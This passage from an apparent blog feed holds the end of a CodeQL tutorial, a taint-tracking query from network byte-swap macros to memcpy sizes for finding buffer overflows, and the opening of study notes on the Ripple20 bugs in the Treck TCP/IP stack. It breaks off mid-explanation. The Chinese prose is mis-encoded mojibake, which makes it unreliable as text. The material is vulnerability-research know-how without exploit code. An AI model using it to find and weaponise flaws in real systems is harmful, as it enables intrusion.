mi.getMacroName().regexpMatch(&quot;ntoh(s|l|ll)&quot;) and</span><br><span class="line">      this &#x3D; mi.getExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from NetworkByteSwap n</span><br><span class="line">select n</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x07-æ•°æ®æµåˆ†æ"><a href="#0x07-æ•°æ®æµåˆ†æ" class="headerlink" title="0x07 æ•°æ®æµåˆ†æ"></a>0x07 æ•°æ®æµåˆ†æ</h3><p>ç°åœ¨æˆ‘ä»¬æ¥å¼€å§‹åšæ•°æ®æµåˆ†æï¼Œ<strong>é€šè¿‡å®šä¹‰æºå’Œæ¥æ”¶å™¨æ¥åˆ›å»º<a href="https://help.semmle.com/qldoc/cpp/semmle/code/cpp/dataflow/TaintTracking.qll/type.TaintTracking$TaintTracking$Configuration.html">é…ç½®</a>ç±»ã€‚</strong> æ¥æºåº”è¯¥æ˜¯è°ƒç”¨<code>ntohl</code>ï¼Œ<code>ntohll</code>æˆ–<code>ntohs</code>ã€‚è¯¥æ¥æ”¶å™¨åº”ä¸ºä¸å®‰å…¨è°ƒç”¨memcpyçš„sizeå‚æ•°ã€‚é€šè¿‡æŸ¥æ‰¾æ­¤ç±»çš„æ•°æ®æµåˆ¤æ–­æ˜¯å¦å­˜åœ¨å®‰å…¨é—®é¢˜</p><p>è¿™é‡Œéœ€è¦ä½¿ç”¨ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªæ–°åº“ï¼Œç„¶åæˆ‘ä»¬è¦è®¾ç½® æ¥æºå’Œ Sink çš„å¯¹è±¡ã€‚</p><p>é¦–å…ˆè®¾ç½®æ¥æºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node source) &#123; source.asExpr() instanceof NetworkByteSwap &#125;</span><br></pre></td></tr></table></figure><p>è®¾ç½®æ¥æºå¯¹è±¡ä¸º è¡¨è¾¾å¼ï¼Œæ˜¯ <code>NetworkByteSwap</code> è¿™ä¸ªç±»çš„å€¼ï¼Œ<code>NetworkByteSwap</code> è¿™ä¸ªç±»åœ¨ 0x06 å®šä¹‰</p><p>ç„¶åè®¾ç½®æ¥æ”¶å™¨ï¼Œæ¥æ”¶å™¨ä¸º <code>memcpy</code> çš„size å‚æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">  exists(FunctionCall c | c.getTarget().getName() &#x3D; &quot;memcpy&quot; and sink.asExpr() &#x3D; c.getArgument(2))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * An expression involved when swapping the byte order of network data.</span><br><span class="line"> * Its value is likely to have been read from the network.</span><br><span class="line"> *&#x2F;</span><br><span class="line">class NetworkByteSwap extends Expr &#123;</span><br><span class="line">  NetworkByteSwap() &#123;</span><br><span class="line">    exists(MacroInvocation mi |</span><br><span class="line">      mi.getMacroName().regexpMatch(&quot;ntoh(s|l|ll)&quot;) and</span><br><span class="line">      this &#x3D; mi.getExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Config extends TaintTracking::Configuration &#123;</span><br><span class="line">  Config() &#123; this &#x3D; &quot;Config: this name doesn&#39;t matter&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source.asExpr() instanceof NetworkByteSwap &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(FunctionCall c | c.getTarget().getName() &#x3D; &quot;memcpy&quot; and sink.asExpr() &#x3D; c.getArgument(2))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, &quot;Network byte swap flows to memcpy&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910183515.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910183515.png"></a></p><p>å…¶ä¸­æœ‰å¤šä¸ªæ˜æ˜¾çš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´</p><h2 id="ä½¿ç”¨CodeQL-è¿›è¡Œ-0day-æŒ–æ˜"><a href="#ä½¿ç”¨CodeQL-è¿›è¡Œ-0day-æŒ–æ˜" class="headerlink" title="ä½¿ç”¨CodeQL è¿›è¡Œ 0day æŒ–æ˜"></a>ä½¿ç”¨CodeQL è¿›è¡Œ 0day æŒ–æ˜</h2><p>æˆ‘ä»¬é€šè¿‡  CodeQL ç¼–å†™äº†ä¸€ä¸ª ntoh -&gt; memcpy çš„æ•°æ®æµè¿½è¸ªï¼Œå½“æˆ‘ä»¬é€šè¿‡æ£€æŸ¥ç›¸åº”çš„ä»£ç æˆ‘ä»¬å³å¯åˆ†ææ˜¯å¦æœ‰ç¼“å†²åŒºæº¢å‡ºé£é™©ã€‚æˆ‘ä»¬å­¦ä¹ äº†å·®ä¸å¤šäº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæˆå‹çš„æŸ¥è¯¢æ¥æŸ¥è¯¢ä¸€äº›ç±»ä¼¼è¿™æ ·çš„å®‰å…¨é—®é¢˜ã€‚</p><p>ä¾‹å¦‚æˆ‘é€šè¿‡è¿™ä¸ªæŸ¥è¯¢ï¼ŒæŒ–æ˜äº†ä¸¤ä¸ªç¼“å†²åŒºæº¢å‡ºæ¼æ´: CVE-2020-28194 å’Œ CVE-2020-15173</p><p>å¤§å®¶ä¹Ÿå¯ä»¥å»å°è¯•å°è¯•ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> codeql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äº CVE-2020-11896å’ŒCVE-2020-11898 çš„å­¦ä¹ ç¬”è®°</title>
      <link href="Ripple20-overview.html"/>
      <url>Ripple20-overview.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>å­¦ä¹ äº†ä¸€ä¸‹è¿™ ripper 20çš„ä¸¤ä¸ªæ´</p><h2 id="CVE-2020-11896"><a href="#CVE-2020-11896" class="headerlink" title="CVE-2020-11896"></a>CVE-2020-11896</h2><h3 id="IPv4-åˆ†ç‰‡"><a href="#IPv4-åˆ†ç‰‡" class="headerlink" title="IPv4 åˆ†ç‰‡"></a>IPv4 åˆ†ç‰‡</h3><p>IPåˆ†ç‰‡ä½¿å¾—å³ä½¿åœ¨IPåˆ†ç»„çš„å¤§å°å¤§äºç½‘ç»œçš„ç‰¹å®šé“¾è·¯ä¸­å…è®¸çš„æœ€å¤§å¤§å°çš„æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä»¥åœ¨ç½‘ç»œä¸­å‘é€IPåˆ†ç»„ã€‚IPåˆ†æ®µæ˜¯ä¸€ç§å°†åˆ†ç»„åˆ†æˆå‡ ä¸ªè¾ƒå°éƒ¨åˆ†(â€œç‰‡æ®µâ€)ä»¥æ”¯æŒåœ¨è¿™äº›é“¾è·¯å’Œç½‘ç»œä¸Šä¼ è¾“çš„æŠ€æœ¯ã€‚è¯¥åè®®æ”¯æŒTHåˆ†ç»„çš„åˆ†æ®µç„¶åé‡ç»„ã€‚</p><p>ä½¿ç”¨IPæŠ¥å¤´ä¸­çš„æ ‡è¯†å­—æ®µå°†ä¸åŒçš„ç‰‡æ®µåˆ†ç»„ã€‚è¯¥æ ‡è¯†å­—æ®µæè¿°ç‰‡æ®µå±äºå“ªä¸ªåˆ†ç»„ã€‚è¿™å…è®¸ä¸åŒçš„æ•°æ®åŒ…åœ¨ç½‘ç»œä¸­åˆ†æ®µä¼ è¾“ï¼Œå¹¶åœ¨å¦ä¸€ç«¯æ­£ç¡®é‡ç»„ã€‚æœ€åä¸€ä¸ªç‰‡æ®µçš„MF(æ›´å¤šç‰‡æ®µ)ä½æ ‡å¿—è®¾ç½®ä¸º0ï¼Œè€Œæ‰€æœ‰å…¶ä»–ç‰‡æ®µçš„MF=1ã€‚</p><p>ç½‘ç»œå †æ ˆè´Ÿè´£å¯¹å¤§å‹æ•°æ®åŒ…è¿›è¡Œåˆ†æ®µï¼Œå¹¶é€šè¿‡ç½‘ç»œå‘é€å¤šä¸ªåˆ†æ®µã€‚è¯·æ±‚å‘é€å¤§å‹æ•°æ®æŠ¥çš„UDPåº”ç”¨ç¨‹åºå°±æ˜¯ä¸€ä¸ªä¾‹å­ã€‚ç½‘ç»œå †æ ˆè¿˜è´Ÿè´£åœ¨æ¥æ”¶åˆ°åˆ†æ®µçš„æ•°æ®åŒ…æ—¶å¯¹å…¶è¿›è¡Œé‡ç»„ã€‚</p><p>å¦‚æœåªæœ‰éƒ¨åˆ†æ•°æ®åŒ…ç¢ç‰‡åˆ°è¾¾ï¼Œç½‘ç»œå †æ ˆæœ€ç»ˆä¼šä¸¢å¼ƒè¿™äº›ç¢ç‰‡ã€‚åœ¨å¤§å¤šæ•°å®ç°ä¸­ï¼Œå½“å¤„ç†ä»»ä½•ç‰‡æ®µæ—¶ï¼Œç½‘ç»œå †æ ˆå¯åŠ¨è®¡æ—¶å™¨ã€‚å½“è¯¥è®¡æ—¶å™¨åˆ°æœŸæ—¶ï¼Œç½‘ç»œå †æ ˆä¸¢å¼ƒå±äºåŒä¸€æ ‡è¯†ç»„çš„æ‰€æœ‰ç‰‡æ®µã€‚</p><p>IPv4é€šè¿‡FlagsåŠFragment Offsetå­—æ®µå¯¹åˆ†ç‰‡è¿›è¡Œç®¡ç†ï¼ŒFlagsç”±Rã€DFã€MFä¸‰éƒ¨åˆ†ç»„æˆï¼š</p><p>â— Rï¼ˆReserve bitï¼‰ä¿ç•™æœªç”¨</p><p>â— DF (Donâ€™t Fragment) DF =1ï¼šç¦æ­¢åˆ†ç‰‡ , DF =0ï¼šå…è®¸åˆ†ç‰‡</p><p>â— MF (More Fragment) MF =1ï¼šéæœ€åä¸€ç‰‡, MF =0ï¼šæœ€åä¸€ç‰‡(æˆ–æœªåˆ†ç‰‡)</p><p>Fragment Offset(13ä½)ï¼šä¸€ä¸ªIPåˆ†ç»„åˆ†ç‰‡å°è£…åŸIPåˆ†ç»„æ•°æ®çš„ç›¸å¯¹åç§»é‡, ç‰‡åç§»å­—æ®µä»¥8å­—èŠ‚ä¸ºå•ä½ã€‚IPåŒ…ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|Version|  IHL  |Type of Service|          Total Length         |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|         Identification        |Flags|      Fragment Offset    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  Time to Live |    Protocol   |         Header Checksum       |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                       Source Address                          |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Destination Address                        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Options                    |    Padding    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><h3 id="IP-éš§é“"><a href="#IP-éš§é“" class="headerlink" title="IP éš§é“"></a>IP éš§é“</h3><p>IPéš§é“å…è®¸ä¸¤ä¸ªç‹¬ç«‹ç½‘ç»œä¹‹é—´çš„è™šæ‹Ÿç‚¹å¯¹ç‚¹é“¾è·¯ã€‚å®ƒæ˜¯é€šè¿‡å°†ä¸€ä¸ªæ•°æ®åŒ…(å¯ä»¥æ˜¯IPæ•°æ®åŒ…)å°è£…åœ¨å¦ä¸€ä¸ªæ•°æ®åŒ…ä¸­æ¥å®ç°çš„ï¼Œä»è€Œä½¿å†…éƒ¨æ•°æ®åŒ…å…·æœ‰ä¸å¤–éƒ¨æ•°æ®åŒ…ä¸åŒçš„æºåœ°å€å’Œç›®çš„åœ°å€ã€‚</p><p>å¤–éƒ¨æ•°æ®åŒ…çš„æºåœ°å€å’Œç›®çš„åœ°å€æ˜¯éš§é“ç«¯ç‚¹ï¼Œå†…éƒ¨æ•°æ®åŒ…ä¸­çš„åœ°å€ç”¨äºéš§é“ä¸¤ç«¯çš„ç½‘ç»œè·¯ç”±ã€‚<br>éš§é“å…¥å£ç‚¹æ˜¯æ¥æ”¶åº”è¯¥é€šè¿‡éš§é“è½¬å‘çš„IPåˆ†ç»„çš„èŠ‚ç‚¹ã€‚å®ƒå°†æ­¤æ•°æ®åŒ…å°è£…åœ¨å¤–éƒ¨IPæ•°æ®åŒ…ä¸­ã€‚å½“æ•°æ®åŒ…åˆ°è¾¾éš§é“å‡ºå£ç‚¹æ—¶ï¼Œä¼šå°†å…¶è§£å°å¹¶è½¬å‘ï¼Œå°±å¥½åƒå®ƒæ˜¯åœ¨ç›®æ ‡ç½‘ç»œä¸­å‘é€çš„å¸¸è§„æ•°æ®åŒ…ä¸€æ ·ã€‚<br>éš§é“ä½¿ç”¨çš„ä¸€ä¸ªä¸»è¦ç¤ºä¾‹æ˜¯è™šæ‹Ÿä¸“ç”¨ç½‘(VPN)æŠ€æœ¯ã€‚<br>æœ‰å‡ ç§éš§é“åè®®ï¼Œæœ€ç®€å•ã€æœ€å¤è€çš„åè®®ä¹‹ä¸€æ˜¯IP-in-IP(IPåè®®å·4)ã€‚</p><h4 id="IP-in-IP"><a href="#IP-in-IP" class="headerlink" title="IP-in-IP"></a>IP-in-IP</h4><p>IP-in-IPæ˜¯ä¸€ç§IPéš§é“åè®®ï¼Œåœ¨è¯¥åè®®ä¸­ï¼Œé€šè¿‡æ·»åŠ å…·æœ‰åˆ†åˆ«ç­‰äºéš§é“å…¥å£ç‚¹å’Œå‡ºå£ç‚¹çš„æºåœ°å€å’Œç›®çš„åœ°å€çš„å¤–éƒ¨IPæŠ¥å¤´ï¼Œå°†ä¸€ä¸ªIPæ•°æ®åŒ…å°è£…åœ¨å¦ä¸€ä¸ªIPæ•°æ®åŒ…ä¸­ã€‚<br>å†…éƒ¨æ•°æ®åŒ…æœªä¿®æ”¹ï¼Œå¤–éƒ¨IPæŠ¥å¤´ä»å†…éƒ¨IPæŠ¥å¤´å¤åˆ¶ä¸€äº›å­—æ®µã€‚å¤–éƒ¨æ ‡å¤´çš„IPåè®®å·ä¸º4ã€‚</p><h3 id="Treck-TCP-IP"><a href="#Treck-TCP-IP" class="headerlink" title="Treck TCP/IP"></a>Treck TCP/IP</h3><p>åœ¨ Treck TCP/IP ä¸­ï¼Œæœ‰ä¸ªç»“æ„ä½“ç”¨æ¥æè¿°å…¶ TCP/IPæ ˆï¼Œç§°ä¸ºtsPacketã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tsPacket</span> &#123;</span></span><br><span class="line">ttUserPacket pktUserStruct;</span><br><span class="line">ttSharedDataPtr pktSharedDataPtr; <span class="comment">// Point to corresponding sharable ttSharedData struct tsPacket * pktChainNextPtr; // Next packet (head of a new datagram in a queue) struct tsDeviceEntry * pktDeviceEntryPtr; // pointer to network Device struct</span></span><br><span class="line"><span class="keyword">union</span> anon_union_for_pktPtrUnion pktPtrUnion; tt32Bit pktTcpXmitTime;</span><br><span class="line">tt16Bit pktUserFlags; tt16Bit pktFlags; tt16Bit pktFlags2;</span><br><span class="line">tt16Bit pktMhomeIndex;</span><br><span class="line">tt8Bit pktTunnelCount; <span class="comment">// Number of times this packet has been decapsulated. Initially set</span></span><br><span class="line">tt8Bit pktIpHdrLen; <span class="comment">// Number of bytes occupied by the IP header.</span></span><br><span class="line">tt8Bit pktNetworkLayer; <span class="comment">// Specifies the network layer type of this packet (IPv4, IPv6,</span></span><br><span class="line">â€¹â†’ ARP, etc).</span><br><span class="line">tt8Bit pktFiller[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯åŒ…å«çš„ttUserPacket ç»“æ„ï¼ˆtsUserPacketçš„typedef ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tsUserPacket</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> * pktuLinkNextPtr; <span class="comment">// Next tsUserPacket for fragmented data</span></span><br><span class="line">ttUser8BitPtr pktuLinkDataPtr; <span class="comment">// Pointer to data</span></span><br><span class="line">ttPktLen pktuLinkDataLength; <span class="comment">// Size of data pointed by pktuLinkDataPtr</span></span><br><span class="line">ttPktLen pktuChainDataLength; <span class="comment">// Total packet length (of chained fragmented data). Valid</span></span><br><span class="line">â€¹â†’ in first link only.</span><br><span class="line"><span class="keyword">int</span> pktuLinkExtraCount; <span class="comment">// Number of links linked to this one (not including this one).</span></span><br><span class="line">â€¹â†’ Valid in first link only.</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pktuLinkDataPtr æŒ‡å‘å½“å‰ç‰‡æ®µçš„æ•°æ®ç¼“å†²åŒºã€‚éšç€ç½‘ç»œå †æ ˆåœ¨ä¸åŒé˜¶æ®µå¤„ç†æ•°æ®åŒ…å¹¶å–å†³äºå½“å‰æ­£åœ¨å¤„ç†çš„æ•°æ®åŒ…å±‚ ï¼Œæ­¤æ•°æ®ç¼“å†²åŒºå†…çš„ç¡®åˆ‡ä½ç½®ä¼šå‘ç”Ÿå˜åŒ–ã€‚ å¯¹äº ä¾‹å¦‚ï¼Œå½“ç½‘ç»œæ ˆå¤„ç†æ‰€è¿°ä»¥å¤ªç½‘å±‚ï¼ˆåœ¨tfEtherRecv ï¼‰ï¼Œè¯¥å­—æ®µæŒ‡å‘ä»¥å¤ªç½‘æŠ¥å¤´ã€‚</p><p>pktuLinkDataLengthå­—æ®µæŒ‡å®špktuLinkDataPtræŒ‡å‘çš„æ•°æ®çš„å¤§å°ï¼Œå³å•ä¸ªç‰‡æ®µçš„å¤§å°ã€‚<br>pktuLinkNextPtrç”¨äºè·Ÿè¸ªæ•°æ®åŒ…ä¸­çš„ç‰‡æ®µã€‚æ­¤å­—æ®µæŒ‡å‘è¡¨ç¤ºä¸‹ä¸€ä¸ªç‰‡æ®µçš„å¦ä¸€ä¸ªtsPacketï¼Œè¯¥ç‰‡æ®µåˆåŒ…å«å¯¹ä¸‹ä¸€ä¸ªç‰‡æ®µçš„å¼•ç”¨ï¼Œä¾æ­¤ç±»æ¨ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨æ­¤é“¾è¡¨ä¸­å°†ç‰‡æ®µç§°ä¸ºâ€œé“¾æ¥â€ã€‚å¦‚æœæ­¤é“¾æ¥æ˜¯æœ€åä¸€ä¸ªç‰‡æ®µï¼Œæˆ–è€…å¦‚æœæ•°æ®æœªåˆ†æ®µï¼Œåˆ™æ­¤å­—æ®µå°†ç­‰äºNULLã€‚<br>pktuChainDataLengthå­—æ®µè¡¨ç¤ºåŒ…æ‹¬æ‰€æœ‰ç‰‡æ®µçš„åˆ†ç»„é•¿åº¦ï¼Œå³åˆ†ç»„çš„æ€»å¤§å°ã€‚å®ƒåªä¸ºç¬¬ä¸€ä¸ªç‰‡æ®µè®¾ç½®ï¼Œå¦‚æœæ•°æ®æ²¡æœ‰åˆ†æ®µï¼Œåˆ™ç­‰äºpktuLinkDataLengthã€‚</p><p>å †æ ˆä¸­çš„ä¸€ç§å¸¸è§æ¨¡å¼æ˜¯åœ¨å †æ ˆä¸­çš„å„å±‚ä¹‹é—´ç§»åŠ¨æ—¶è°ƒæ•´pktuLinkDataPtræŒ‡é’ˆã€‚ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬çš„æ•°æ®åŒ…æ˜¯ICMPå›åº”è¯·æ±‚æ•°æ®åŒ…(PING)ï¼Œåˆ™å®ƒå°†ç”±ä¸‰å±‚ç»„æˆï¼šä»¥å¤ªç½‘ï¼Œç„¶åæ˜¯IPv4ï¼Œæœ€åæ˜¯ICMPã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå½“ä»¥å¤ªç½‘å±‚è¢«å¤„ç†æ—¶(åœ¨å‡½æ•°tfEtherRecvä¸­)ï¼ŒpktuLinkDataPtræŒ‡å‘ä»¥å¤ªç½‘å¤´çš„å¼€å§‹ï¼Œç„¶ååœ¨ç§»åŠ¨åˆ°ä¸‹ä¸€å±‚ä¹‹å‰ï¼Œä½¿ç”¨ä»¥ä¸‹ä»£ç å¯¹å…¶è¿›è¡Œè°ƒæ•´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pkt-&gt;pktuLinkDataPtr = pkt-&gt;pktuLinkDataPtr + <span class="number">0xe</span>;</span><br><span class="line">pkt-&gt;pktuLinkDataLength = pkt-&gt;pktuLinkDataLength - <span class="number">0xe</span>; </span><br><span class="line">pkt-&gt;pktuChainDataLength = pkt-&gt;pktuChainDataLength - <span class="number">0xe</span>;</span><br></pre></td></tr></table></figure><p>åœ¨æœ¬ä¾‹ä¸­ï¼Œ0xE(åè¿›åˆ¶14)æ˜¯ä»¥å¤ªç½‘å¤´çš„å¤§å°(6(Dst MAC)+6(Src MAC)+2(EtherType))ã€‚<br>å½“tfEtherRecvå®Œæˆæ•°æ®åŒ…å¤„ç†æ—¶ï¼Œå®ƒä¼šä½¿ç”¨ä»£è¡¨ä¸‹ä¸€å±‚åè®®çš„EtherTypeå­—æ®µå°†æ•°æ®åŒ…è½¬å‘åˆ°ä¸‹ä¸€å±‚å¤„ç†ã€‚é‡åˆ°çš„æ”¯æŒçš„ä»¥å¤ªç½‘ç±»å‹æœ‰ARPã€IPv4å’ŒIPv6ã€‚</p><a href="https://lh4.googleusercontent.com/hELEgQOjkR6bZJsVt5BABrxheHT47maZrgrlrQQ_et0IyFebfxL1JhnUHtdEE-0TWN92dxV5i4AYbKqUru0fVz12lAyXlf0V-5fvHLepAWkJQSt8T-pO79BdoW6UZ821xxMUOpA" title="img" class="gallery-item"><img src="https://lh4.googleusercontent.com/hELEgQOjkR6bZJsVt5BABrxheHT47maZrgrlrQQ_et0IyFebfxL1JhnUHtdEE-0TWN92dxV5i4AYbKqUru0fVz12lAyXlf0V-5fvHLepAWkJQSt8T-pO79BdoW6UZ821xxMUOpA" alt="img" style="zoom:50%;" /></a><p>åœ¨æ­¤çš„ç¤ºä¾‹ä¸­ï¼Œå½“IPv4å±‚æ¥æ”¶åˆ°æ•°æ®åŒ…(åœ¨å‡½æ•°tfIpIncomingPacketä¸­)æ—¶ï¼ŒæŒ‡é’ˆpktuLinkDataPtrå·²ç»æŒ‡å‘ä»¥å¤ªç½‘å¤´ï¼Œå› æ­¤å¯ä»¥å®‰å…¨åœ°å‡è®¾pktuLinkDataPtræŒ‡å‘çš„æ•°æ®æ˜¯IPv4å¤´ã€‚<br>ä¼ å…¥çš„æ•°æ®ç”±å…·æœ‰ç›¸åŒå‘½åçº¦å®šTF<em>IncomingPacketçš„å‡½æ•°å¤„ç†(æ­£å¦‚æˆ‘ä»¬å·²ç»çœ‹åˆ°çš„)ï¼Œå…¶ä¸­</em>æ˜¯åè®®åç§°ã€‚åœ¨ä»¥å¤ªç½‘/IPv4/ICMPçš„æƒ…å†µä¸‹ï¼ŒåŒ…å°†ç”±å‡½æ•°tfEtherRecvã€tfIpIncomingPacketå¤„ç†ã€‚<br>å’ŒtfIcmpIncomingPacketã€‚<br>Treckå †æ ˆå¤„ç†ä»tfIpIncomingPacketè°ƒç”¨çš„è¿‡ç¨‹tfIpReAssemblePacketä¸­çš„ç‰‡æ®µé‡ç»„ã€‚æ¯å½“æ¥æ”¶åˆ°å‘å¾€è®¾å¤‡çš„IPç‰‡æ®µæ—¶ï¼Œéƒ½ä¼šè°ƒç”¨æ­¤è¿‡ç¨‹ã€‚å¦‚æœç¼ºå°‘ç‰‡æ®µï¼Œåˆ™å‡½æ•°è¿”å›NULLã€‚å¦åˆ™ï¼Œå¦‚æœæ‰€æœ‰ç‰‡æ®µéƒ½åˆ°è¾¾å¹¶ä¸”æ²¡æœ‰æ¼æ´ï¼Œåˆ™ç½‘ç»œå †æ ˆä½¿ç”¨pktuLinkNextPtrå­—æ®µå°†ç‰‡æ®µé“¾æ¥åœ¨ä¸€èµ·ï¼Œå¹¶ä¼ é€’æ•°æ®åŒ…ä»¥ä¾›ä¸‹ä¸€å±‚è¿›ä¸€æ­¥å¤„ç†ã€‚åœ¨æ­¤ä¸Šä¸‹æ–‡ä¸­çš„å•è¯â€œé‡ç»„â€å¹¶ä¸æ„å‘³ç€å°†åˆ†ç»„å¤åˆ¶åˆ°è¿ç»­çš„å­˜å‚¨å—ï¼Œè€Œæ˜¯ç®€å•åœ°å°†å®ƒä»¬é“¾æ¥åœ¨ä¸€ä¸ªé“¾è¡¨ä¸­ã€‚</p><h3 id="æ¼æ´åŸå› "><a href="#æ¼æ´åŸå› " class="headerlink" title="æ¼æ´åŸå› "></a>æ¼æ´åŸå› </h3><p>ä¸ºäº†äº†è§£æ¼æ´çš„æ ¹æœ¬åŸå› ï¼Œæˆ‘ä»¬å°†å¿«é€ŸæŸ¥çœ‹IPæ ‡å¤´ä¸­çš„ä¸¤ä¸ªå­—æ®µï¼š</p><p><em>â€¢</em> IHL ï¼ˆ4ä¸ªæ¯”ç‰¹ï¼‰ï¼šè¯¥å°ºå¯¸çš„æ‰€è¿°IP æŠ¥å¤´ä¸­çš„åŒå­—ã€‚æœ€ä½å€¼æ˜¯5 ï¼ˆ20 